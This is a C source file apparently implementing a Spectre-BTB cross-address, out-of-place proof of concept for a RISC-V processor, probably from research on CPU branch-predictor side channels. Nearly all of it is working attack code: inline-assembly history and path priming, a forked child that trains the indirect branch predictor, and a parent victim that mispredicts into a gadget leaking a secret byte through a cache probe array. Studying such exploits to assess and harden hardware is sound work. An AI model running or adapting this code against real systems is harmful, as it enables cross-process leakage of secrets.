#include <stddef.h>
size_t CACHE_MISS = 0;
#include "../../../exploit_framework.h"

// BTB ca-oop: cross-address out-of-place via fork, IBP collision
// Parent trains BTB with TRAIN_VALUE, child has real secret
// Speculative misprediction in child leaks secret

uint8_t* probe_array;
volatile uint8_t current_encode_value;

#define TRAIN_VALUE 0x01

// GHR spray: fill global history register with taken branches
volatile int spray_cond = 1;
#define BEQ asm volatile("beq %0, %1, 1f\n1:" : : "r"(spray_cond), "r"(1));
#define BEQ_8 BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ

// Path reg prime: 4 indirect jumps via inline asm (no returns)
// auipc=4, c.addi=2, c.jr=2 = 8 bytes per block
#define PATH_PRIME asm volatile( \
    "auipc t0, 0\n\t" \
    "addi t0, t0, 8\n\t" \
    "jr t0\n\t" \
    "auipc t0, 0\n\t" \
    "addi t0, t0, 8\n\t" \
    "jr t0\n\t" \
    "auipc t0, 0\n\t" \
    "addi t0, t0, 8\n\t" \
    "jr t0\n\t" \
    "auipc t0, 0\n\t" \
    "addi t0, t0, 8\n\t" \
    "jr t0\n\t" \
    : : : "t0");

// GHR spray + PATH_PRIME to set both GHR and path_reg consistently
static inline __attribute__((always_inline)) void ghr_spray(void) {
    BEQ_8
}

// IBP_PRIME now just does GHR spray - PATH_PRIME is in the aligned functions
#define IBP_PRIME do { ghr_spray(); PATH_PRIME; } while(0)

typedef void (*target_t)(void);
target_t __attribute__((aligned(4096))) train_table[1024];
target_t __attribute__((aligned(4096))) attack_table[1024];

void __attribute__((noinline)) dump_secret(void) {
    SPEC_FENCE();
    maccess(probe_array + current_encode_value * PAGE_SIZE);
}

void __attribute__((noinline)) dummy(void) {
    maccess(probe_array + TRAIN_VALUE * PAGE_SIZE);
}

#ifdef P550
#define BTB_ALIGN 65536
#else
#define BTB_ALIGN 8192
#endif

void __attribute__((noinline, aligned(BTB_ALIGN))) train_accessor(int idx) {
    train_table[STALL(idx)]();
}
void __attribute__((noinline, aligned(BTB_ALIGN))) attack_accessor(int idx) {
    attack_table[STALL(idx)]();
}

// Aligned subfunctions: IBP_PRIME + accessor call
void __attribute__((noinline, aligned(BTB_ALIGN))) aligned_train(void) {
    IBP_PRIME;
    train_accessor(0);
}
void __attribute__((noinline, aligned(BTB_ALIGN))) aligned_attack(void) {
    IBP_PRIME;
    attack_accessor(0);
}

void btb_ca_oop_setup(exploit_ctx_t* ctx, void* data) {
    // Swapped: child trains (dump_secret with TRAIN_VALUE), parent is victim
    train_table[0] = dump_secret;   // Child will call this via aligned_train
    attack_table[0] = dummy;        // Parent will call this, should mispredict to dump_secret
    ctx->exclude_enabled = true;
    ctx->exclude_value = TRAIN_VALUE;
}

void btb_ca_oop_child_loop(exploit_ctx_t* ctx, void* data) {
    // Child is now the TRAINER - continuously trains IBP with dump_secret
    current_encode_value = TRAIN_VALUE;
    mfence();
    for (int i = 0; i < 1000; i++) {
        aligned_train();  // Train IBP: jr → dump_secret
    }
}

void btb_ca_oop_parent_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    // Parent is now the VICTIM - should mispredict to dump_secret, leaking encode_index
    current_encode_value = encode_index;
    mfence();
    for (int i = 0; i < 1500; i++) {
        aligned_attack();  // Should mispredict to dump_secret via IBP aliasing
    }
}

int main() {
    exploit_ctx_t ctx = {0};
    if (exploit_init(&ctx) != 0) return 1;
    probe_array = ctx.probe_array;

    printf("Spectre-BTB ca-oop\n");

    exploit_hooks_t hooks = {
        .setup = btb_ca_oop_setup,
        .child_loop = btb_ca_oop_child_loop,
        .parent_attack = btb_ca_oop_parent_attack
    };

    exploit_run(&ctx, &hooks, NULL);
    exploit_print_results("BTB cross-address out-of-place", &ctx);
    exploit_cleanup(&ctx);
    return 0;
}
